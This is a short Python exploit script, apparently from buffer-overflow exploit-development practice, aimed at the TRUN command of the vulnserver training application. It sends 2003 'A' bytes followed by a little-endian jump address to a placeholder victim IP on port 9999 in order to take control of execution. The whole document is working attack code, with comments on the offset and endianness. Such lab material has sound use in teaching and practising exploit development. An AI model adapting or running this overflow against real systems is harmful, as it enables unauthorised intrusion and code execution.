#! /usr/bin/python
import sys
import socket

# This is the number we get when we run pattern_offset.rb
# pattern_offset.rb -l 2003 -q 386F4337
offset_number = 2003

# Address of the pointer : Here for eg : 0x625011af
address = "\xaf\x11\x50\x62"
# notice the address is in reverse order because the x86 systme uses little endian format which means higher bit in lower order

offset = "A" * offset_number + address

# Enter the port vulnserver is listening on
PORT = 9999
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('YOUR_VICTIM_IP', PORT))
    s.send(('TRUN /.:/' + offset))
    s.close()
except:
    print("Some error in connecting to the vulnserver running")
    sys.exit()
